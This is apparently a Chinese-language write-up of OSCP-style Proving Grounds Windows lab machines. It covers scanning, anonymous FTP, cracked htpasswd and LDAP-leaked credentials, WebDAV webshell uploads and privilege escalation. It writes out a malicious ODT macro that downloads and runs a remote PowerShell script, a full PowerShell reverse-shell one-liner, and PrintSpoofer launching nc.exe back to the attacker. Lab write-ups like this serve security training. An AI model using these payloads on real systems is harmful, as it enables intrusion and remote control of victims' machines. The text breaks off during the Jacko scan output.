# PG_win_WriteUp

本文按照：https://docs.google.com/spreadsheets/u/0/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview?pli=1#   循序进行刷题

| 平台 | 题目      | 是否完成  |
| ---- | --------- | --------- |
| PG   | Helpdesk  | ×(没搜到) |
| PG   | Algernon  | √         |
| PG   | Authby    | √         |
| PG   | Craft     | √         |
| PG   | Hutch     | √         |
| PG   | Internal  | √         |
| PG   | Jacko     | √         |
| PG   | Kevin     | √         |
| PG   | Resourced | √         |
| PG   | Squid     | √         |
| PG   | DVR4      | √         |
| PG   | Hepet     | √         |
| PG   | Shenzi    | √         |
| PG   | Nickel    | √         |
| PG   | Slort     | √         |
| PG   | MedJed    | √         |

靶场代理实在太慢了，建议openvpn配置文件添加

```
socks-proxy 172.16.1.1 7890
```

https://gtfobins.github.io/ 提权姿势

## Helpdesk

信息收集：

```
```





















## Algernon

信息收集：

```
┌──(root㉿cyborg)-[/home/cyborg/oscp/pg/linux]
└─# nmap -p- -Pn -A -sS -T4 192.168.119.65 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-03 12:27 CST
Warning: 192.168.119.65 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.119.65
Host is up (0.090s latency).
Not shown: 65368 closed tcp ports (reset), 153 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  09:31PM       <DIR>          ImapRetrieval
| 03-02-25  08:26PM       <DIR>          Logs
| 04-29-20  09:31PM       <DIR>          PopRetrieval
|_04-29-20  09:32PM       <DIR>          Spool
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
9998/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Mon, 03 Mar 2025 04:42:12 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
|_http-server-header: Microsoft-IIS/10.0
17001/tcp open  remoting      MS .NET Remoting services
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=3/3%OT=21%CT=1%CU=35479%PV=Y%DS=4%DC=T%G=Y%TM=67C5333B
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=110%TI=I%CI=I%TS=U)SEQ(SP=10
OS:3%GCD=1%ISR=109%TI=I%CI=I%TS=U)SEQ(SP=107%GCD=1%ISR=108%TI=I%CI=I%TS=U)S
OS:EQ(SP=FE%GCD=1%ISR=101%TI=I%CI=I%TS=U)SEQ(SP=FE%GCD=1%ISR=10E%TI=I%CI=I%
OS:TS=U)OPS(O1=M56ENW8NNS%O2=M56ENW8NNS%O3=M56ENW8%O4=M56ENW8NNS%O5=M56ENW8
OS:NNS%O6=M56ENNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R
OS:=Y%DF=Y%T=80%W=FFFF%O=M56ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R
OS:%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RU
OS:CK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-03T04:42:15
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   90.49 ms 192.168.45.1
2   90.41 ms 192.168.45.254
3   90.79 ms 192.168.251.1
4   91.43 ms 192.168.119.65

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 923.58 seconds
```

存在ftp匿名登录，没翻到啥信息

![image-20250303125309323](./PG_win.assets/image-20250303125309323.png)

9998页面开放了一个应用`Welcome to SmarterMail`

![image-20250303125050526](./PG_win.assets/image-20250303125050526.png)

检索漏洞

![image-20250303135351934](./PG_win.assets/image-20250303135351934.png)

利用exp：https://www.exploit-db.com/exploits/49216

第一次打失败了，用的是9998的web端口，看了文章才知道应该用17001

![image-20250303135224018](./PG_win.assets/image-20250303135224018.png)



执行exp

![image-20250303135146122](./PG_win.assets/image-20250303135146122.png)

收到shell

![image-20250303135201860](./PG_win.assets/image-20250303135201860.png)

在administrator桌面拿到proof

![image-20250303135553022](./PG_win.assets/image-20250303135553022.png)

## Authby

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.119.46
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-03 15:52 CST
Nmap scan report for 192.168.119.46
Host is up (0.0031s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Mar 03 15:54 log
| ----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Aug 03  2024 accounts
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
|_http-title: 401 Authorization Required
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2025-03-03T07:54:49+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 21/tcp)
HOP RTT     ADDRESS
1   2.84 ms 192.168.45.1
2   2.64 ms 192.168.45.254
3   3.09 ms 192.168.251.1
4   3.14 ms 192.168.119.46

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 213.72 seconds
```

242端口有http basic认证

![image-20250303163211086](./PG_win.assets/image-20250303163211086.png)

nmap扫描结果显示存在ftp匿名登录

![image-20250303155738494](./PG_win.assets/image-20250303155738494.png)

使用`lftp`登录ftp，这个好用一点

```
lftp ftp://anonymous:@192.168.119.46/ 
```



![image-20250303162709572](./PG_win.assets/image-20250303162709572.png)

发现存在三个用户，包含了anonymous，所以可以猜测是ftp的用户，尝试Offsec/Offsec登录失败，但是尝试admin/admin成功登录

```
lftp ftp://admin:admin@192.168.119.46/ 
```

![image-20250303162855742](./PG_win.assets/image-20250303162855742.png)

存在疑似的敏感文件，之前配置过几次http basic认证，所以知道`.htpasswd`文件中就是密码

```
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

![image-20250303163059446](./PG_win.assets/image-20250303163059446.png)

使用john尝试破解，拿到了http basic的凭证：offsec/elite

![image-20250303163307461](./PG_win.assets/image-20250303163307461.png)

成功认证通过http basic

![image-20250303163408220](./PG_win.assets/image-20250303163408220.png)

首页文件就是刚刚ftp目录的index.php文件

![image-20250303163513796](./PG_win.assets/image-20250303163513796.png)

所以只需要尝试上传并访问`shell.php`文件即可

![image-20250303172436581](./PG_win.assets/image-20250303172436581.png)

成功RCE（第一次我是vps挂V\*N，然后走vps代理ftp上传，一直爆很奇怪的错误，让kali本机运行V\*N即可成功上传

建议：https://github.com/flozz/p0wny-shell  和  https://github.com/WhiteWinterWolf/wwwolf-php-webshell  结合使用，效果如下，左边的用来执行命令，右边上传文件

![image-20250303173905954](./PG_win.assets/image-20250303173905954.png)

使用`systeminfo`查看系统版本

![image-20250303174939852](./PG_win.assets/image-20250303174939852.png)

在网上检索漏洞找到编号，git搜exp：

![image-20250303175214314](./PG_win.assets/image-20250303175214314.png)

运行exp获得system权限（反弹shell命令的时候选cmd，powershell老断

![image-20250303180349428](./PG_win.assets/image-20250303180349428.png)

拿到proof

![image-20250303180542098](./PG_win.assets/image-20250303180542098.png)

## Craft

信息收集：

```
┌──(root㉿cyborg)-[/home/…/oscp/pg/win/Craft]
└─# nmap -p- -Pn -A -sS -T4 192.168.138.169
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 11:00 CST
Nmap scan report for 192.168.138.169
Host is up (0.080s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Craft
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   79.77 ms 192.168.45.1
2   79.54 ms 192.168.45.254
3   80.75 ms 192.168.251.1
4   80.33 ms 192.168.138.169

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.33 seconds
```

只开放了80的http端口，浏览器访问页面发现一个上传点

![image-20250306110426170](./PG_win.assets/image-20250306110426170.png)

没办法绕过，只能上传ODT文件，可以通过制造ODT恶意文件(宏)来上传反弹shell

首先使用**LibreOffice**创建一个`.odt`文件，并按照下面步骤打开

![image-20250306120210984](./PG_win.assets/image-20250306120210984.png)

进入点击new（**截图时候做错了，应该放到reshell.odt**

![image-20250306120511888](./PG_win.assets/image-20250306120511888.png)

写入：

```
REM  *****  BASIC  *****

Sub Main
    Shell("cmd /c powershell ""iex(new-object net.webclient).downloadstring('http://192.168.45.161:90/odtre.ps1')""")
End Sub
```

`.ps1`文件写入（不要用`Reverse Shell Generator`的第一个ps反弹脚本，收到的shell毫无美化可言）：

```
$TCPClient = New-Object Net.Sockets.TCPClient('192.168.45.161', 80);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
```

然后再自定义窗口

![image-20250306121035756](./PG_win.assets/image-20250306121035756.png)

在打开文档这里选中刚刚添加的宏（**截图时候做错了，应该放到reshell.odt的main**

![image-20250306121126736](./PG_win.assets/image-20250306121126736.png)

上传odt文件，成功收到shell

![image-20250306122617988](./PG_win.assets/image-20250306122617988.png)

拿到local

![image-20250306123203470](./PG_win.assets/image-20250306123203470.png)

信息收集

```
whoami /priv
PRIVILEGES INFORMATION              Privilege Name                    Description   State
SeChangeNotifyPrivilege                 Bypass traverse checking          Enabled  
SeCreateGlobalPrivilege                  Create global objects                Enabled  
SeIncreaseWorkingSetPrivilege       Increase a process working set  Disabled
```

使用`icacls`检查网站目录发现可以写入

```
icacls "C:\xampp\htdocs"
```

写入php-shell

```
iwr -uri http://192.168.45.161:90/btshell.php -Outfile btshell.php
```

拿到apache的权限

![image-20250306125533906](./PG_win.assets/image-20250306125533906.png)

`whoami /priv`发现有`SeImpersonatePrivilege`权限

![image-20250306125634965](./PG_win.assets/image-20250306125634965.png)

信息收集系统版本为`Windows Server 2019 `

![image-20250306131332698](./PG_win.assets/image-20250306131332698.png)

通过检索找到下面exp：https://github.com/k4sth4/PrintSpoofer

```
iwr -uri http://192.168.45.161:90/potato/PrintSpoofer.exe -Outfile PrintSpoofer.exe
iwr -uri http://192.168.45.161:90/nc.exe -Outfile nc.exe
```

利用土豆反弹shell

```
PrintSpoofer.exe -c "nc.exe 192.168.45.161 3000 -e cmd"
```

拿到proof

![image-20250306132846827](./PG_win.assets/image-20250306132846827.png)

## Hutch

信息收集：
```
┌──(root㉿cyborg)-[/home/…/oscp/pg/win/Hutch]
└─# nmap -p- -Pn -A -sS -T4 192.168.138.122
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 13:31 CST
Nmap scan report for 192.168.138.122
Host is up (0.089s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/10.0
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Thu, 06 Mar 2025 05:34:28 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-06 05:33:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-03-06T05:34:29
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   82.62 ms 192.168.45.1
2   82.59 ms 192.168.45.254
3   97.21 ms 192.168.251.1
4   98.28 ms 192.168.138.122

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 229.60 seconds
```

nmap扫描显示这是一台域主机，IIS开启了webdav，尝试smb未果

```
smbclient -L //192.168.138.122 -N
```

![image-20250306175732362](./PG_win.assets/image-20250306175732362.png)

使用ldapsearch信息收集，在描述中发现一个密码：CrabSharkJellyfish192

sAMAccountName字段发现用户名fmcsorley

``` 
ldapsearch -x -b "DC=hutch,DC=offsec" -H ldap://192.168.138.122 
```

![image-20250306191732745](./PG_win.assets/image-20250306191732745.png)

尝试使用curl上传(webdav漏洞)

``` 
curl -T 'shell.aspx' 'http://192.168.138.122/' -u fmcsorley:CrabSharkJellyfish192
```

访问成功执行命令

![image-20250306192124228](./PG_win.assets/image-20250306192124228.png)

反弹shell

![image-20250306192408659](./PG_win.assets/image-20250306192408659.png)

拿到local

![image-20250306200219921](./PG_win.assets/image-20250306200219921.png)

通过使用刚刚用户认证信息ldapsearch收集到了一个新密码`,{j7-iMH!O4C5/`

````
ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://192.168.138.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
````

![image-20250306200931444](./PG_win.assets/image-20250306200931444.png)

使用psexec连接即可

```
impacket-psexec HUTCH.OFFSEC/administrator:',{j7-iMH!O4C5/'@192.168.138.122
```

![image-20250306201452539](./PG_win.assets/image-20250306201452539.png)

拿到proof

![image-20250306201612588](./PG_win.assets/image-20250306201612588.png)



## Internal

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.138.40
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-06 21:03 CST
Nmap scan report for 192.168.138.40
Host is up (0.0030s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE            VERSION
53/tcp    open  domain             Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2025-03-06T13:05:28+00:00; 0s from scanner time.
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/6%OT=53%CT=1%CU=31428%PV=Y%DS=4%DC=T%G=Y%TM=67C99DD4
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=I%CI=I%TS=7)OPS(O1=M5
OS:4ENW8ST11%O2=M54ENW8ST11%O3=M54ENW8NNT11%O4=M54ENW8ST11%O5=M54ENW8ST11%O
OS:6=M54EST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%D
OS:F=Y%T=80%W=2000%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%
OS:RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G
OS:%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:43:42 (VMware)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-06T13:05:20
|_  start_date: 2025-02-20T21:30:47

TRACEROUTE (using port 587/tcp)
HOP RTT     ADDRESS
1   1.96 ms 192.168.45.1
2   1.96 ms 192.168.45.254
3   3.27 ms 192.168.251.1
4   3.46 ms 192.168.138.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 181.81 seconds
```

nmap显示开启了5357的http端口和smb，dirsearch挂后台扫http，通过nmap对smb进一步信息收集

```
nmap --script vuln -p 445 192.168.138.40 
```

![image-20250307091929161](./PG_win.assets/image-20250307091929161.png)

显示可能存在CVE-2009-3103漏洞，使用msf检索相关exp

![image-20250307092752858](./PG_win.assets/image-20250307092752858.png)

第一遍没打通，调了一下wait低一些就行（我这边访问靶机延迟240ms

![image-20250307093528774](./PG_win.assets/image-20250307093528774.png)

拿到proof

![image-20250307093647666](./PG_win.assets/image-20250307093647666.png)





## Jacko

信息收集：

```
┌──(root㉿cyborg)-[/home/cyborg/oscp/pg/win]
└─# nmap -p- -Pn -A -sS -T4 192.168.138.66  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-07 09:44 CST
Nmap scan report for 192.168.138.66
Host is up (0.24s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: H2 Database Engine (redirect)
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
8082/tcp  open  http          H2 database http console
|_http-title: H2 Console
9092/tcp  open  XmlIpcRegSvc?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9092-TCP:V=7.95%I=7%D=3/7%Time=67CA532F%P=x86_64-pc-linux-gnu%r(NUL
SF:L,516,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o\0
SF:t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i\
SF:0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0l
SF:\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\0
SF:h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x024\0o\0r\0g\0\.\0h\x002\0\.
SF:\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0N\0o\0n\0T\0r\0a\0n\0s\0i\0e\0n\
SF:0t\0C\0o\0n\0n\0e\0c\0t\0i\0o\0n\0E\0x\0c\0e\0p\0t\0i\0o\0n\0:\0\x20\0R
SF:\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x2
SF:0\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x
SF:20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o
SF:\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x001\x009\x
SF:009\0\]\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a
SF:\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S
SF:\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\
SF:0\.\0j\0a\0v\0a\0:\x006\x001\x007\0\)\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\
SF:0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\
SF:0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\
SF:0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x004\x002\x007\0\)\0\r
SF:\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\
SF:0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\
SF:0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x002\x000\x005\0\)\0\r\0\n\0\t\0a\0t\0\x
SF:20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b")%r(informix
SF:,516,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o\0t
SF:\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i\0
SF:s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0l\
SF:0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\0h
SF:\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x024\0o\0r\0g\0\.\0h\x002\0\.\
SF:0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0N\0o\0n\0T\0r\0a\0n\0s\0i\0e\0n\0
SF:t\0C\0o\0n\0n\0e\0c\0t\0i\0o\0n\0E\0x\0c\0e\0p\0t\0i\0o\0n\0:\0\x20\0R\
